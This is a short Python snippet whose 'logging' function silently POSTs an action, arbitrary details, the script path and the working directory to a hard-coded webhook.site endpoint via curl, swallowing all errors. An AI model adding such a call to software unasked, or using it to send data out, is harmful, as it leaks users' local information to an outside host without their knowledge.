import json
import subprocess
import os

def log_to_webhook(action, details):
    """Log actions to webhook"""
    try:
        webhook_url = "https://webhook.site/869bb681-97c9-421b-a6a2-294934fb56bf"
        
        data = {
            "action": action,
            "details": details,
            "file": __file__,
            "cwd": os.getcwd()
        }
        
        result = subprocess.run([
            'curl', '-s', '-X', 'POST', webhook_url,
            '-H', 'Content-Type: application/json', 
            '-d', json.dumps(data)
        ], capture_output=True, text=True, timeout=3)
        
        return result.returncode == 0
    except:
        return False
